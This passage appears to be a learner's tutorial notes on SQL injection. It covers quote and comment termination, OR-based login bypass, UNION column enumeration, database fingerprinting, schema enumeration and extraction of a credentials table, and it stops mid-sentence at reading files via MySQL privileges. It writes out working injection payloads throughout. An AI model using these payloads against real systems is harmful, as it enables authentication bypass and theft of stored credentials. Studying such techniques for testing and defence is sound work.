We can use different methods to subvert / prematurely end the query and insert what we want the engine to do for us, first, we need to guess what kind of query at the back is being executed and where our statement is inserted, below is some method for us to do injections.

-Using ' to terminate term:

For example our query is:
```
select * from logins where username like '%input'
```

We need to first input ' to terminate the term %input first, then we can input statement that we like (for the above example, we require more techniques for it to actually work)

-Using or to subvert the queue logic:

A common case to use or in subverting queue logic is to perform auth bypass, consider the following statement:

```
SELECT * FROM logins WHERE username='<username>' AND password = '<pw>';
```

if we happen to know a valid username, then what we need to do is to have the query always evaluate to true, we can then subvert the logic by adding a 1=1:

```
SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';
```

The 1=1 AND password = something would evaluate to false, but the username = admin or false will evaluate to true, at this case we can login as long as the username we provide is valid

However, if we do not know any user and we just want to get ourselves into the system, what we want to do is do further subvert the query by adding or at the password side as well, so that the query becomes:
```
SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something' or '1'= '1';
```
Usually, when inserting query, usually we would do something like a '1' = '1, notice that the final singlequote is not present as most likely we would be finishing that with the singlequote the one that comes from the prepared query.

-Using Comments to terminate query early

Somtimes, the query itself may perform different checks aside from checking if the information provided is correct, with the use of comments, we can possibly terminate the query early, allowing us to perform auth bypass, below is an example:

```
SELECT * FROM logins WHERE (username='<input1>' AND ........) AND password = '<hashofinput2>'
```

We can see that input2 is hashed, so we can't really inject it in there, also there is additional check after input 1, however, if we are able to guess the queue structure, use comments to terminate the conditions early and provide back all essential symbols, we can auth bypass, below is the correct payload on input1:

```
admin') -- -
```
Notice that we actually gave back 1 ' and 1 ) before terminating with -- , also notice that the correct symbol for terminating with comment is -- , where it is composed by 2 - and 1 space, the - after the comment symbol is only for demo purpose

-Union Injection:

Union select is a function that allows us to "combine" queries into same output, for example:
```
SELECT * FROM ports UNION SELECT * FROM ships;
```

The following queries combine the select result from ports and ships and output them into the same columns, by using union and other techniques, we can perform union injection and enumerate some properties regarding current database

-Columns Enumeration using ORDER BY:

To perform union injection, we need to ensure that the 2 queries that we are unioning have the same number of column when returning, therefore, we first need to check how many columns the original query is going to return, one of them is using order by, we can check how many column original query have by terminating and add order by x, then comment out, like the following
```
select * from ports where portcode = '<searchterm>'
select * from ports where portcode = cn' order by 1 -- 
```
Then, we increment the integer inputted in order by by 1 each time the command executed successfully, then until the query failed, the parameter used for the last time the command is successfully executed is the number of columns outputted. 

-Columns Enumeration using UNION

As mentioned before, union queries require a same amount of columns in order to succeed, therefore we can keep editing our union query and increment with numbers until we successfully got a result:
```
select * from ports where portcode = '<searchterm>'
select * from ports where portcode = cn' UNION select 1,2-- -
```
We keep adding 1,2,3,4... until something actually returns for our query, this method has 1 advantage, we get to know which column actually is displayed since we labelled them using numbers.

-Database Enumeration

Below is a list of payload we can use to identify what SQL we are dealing:

|Payload|When to Use|Expected Output|Wrong Output|
|---|---|---|---|
|`SELECT @@version`|When we have full query output|MySQL Version 'i.e. `10.3.22-MariaDB-1ubuntu1`'|In MSSQL it returns MSSQL version. Error with other DBMS.|
|`SELECT POW(1,1)`|When we only have numeric output|`1`|Error with other DBMS|
|`SELECT SLEEP(5)`|Blind/No Output|Delays page response for 5 seconds and returns `0`.|Will not delay response with other DBMS|
Before we use union query to extract database, we first need to see the DB's structure, to do that we can first obtain info on INFORMATION_SCHEMA DB, the SCHEMATA table contains names of DB available in the server, so we can query it with something like:
```
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
#This just example, fill in until column number matches and locate columns that are displayed.
```
We can locate the current DB with select database() command, therefore the example command becomes:
```
cn' UNION select 1,database(),3,4-- -
```

Next, we can query the TABLES table in the INFORMATION_SCHEMA db to enumerate what table a db has, the TABLE_NAME contains table names while TABLE_SCHEMA tells us which db it is related to, the following example shows how to seek tables within database dev:
```
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
```
Finally, we can query what column a table has by accessing the COLUMNS table in the INFORMATION_SCHEMA db, the COLUMN_NAME, TABLE_NAME and TABLE_SCHEMA will tell us all we need to know and the following example extracts all column information in the table credentials:
```
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
```

Assume the above query showed us that 2 column, username and password, is inside the table credentials, we can then extract it with our union query:
```
cn' UNION select 1, username, password, 4 from dev.credentials-- -
```

Reading Files:

To read files in MySQL, one would need FILE Privilege in order to do so, below is how to gather data to determine if one have enough privilege in doing so:

The following queries query the current user:
```
SELECT USER()
SELECT CURRENT_USER()
SELECT user from mysql.user
```

therefore, continuing our previous context, the union execution becomes:
```
cn' UNION SELECT 1, user(), 3, 4-- -
```
or
```
cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -
```

Then, we need to check if we have the super admin privileges, which can be found by following query:
```
SELECT super_priv FROM mysql.user WHERE user="<currentuser>"
```

Therefore, when used in union, it becomes:
```
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="<currentuser>"-- -
```

We can dump all of our owned privilege by using the following query:
```
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'<currentuser>'@'localhost'"-- -
#if we dont have that many column, grantee can be discarded and left only privilege_type
```

If enough privilege is provided, then we 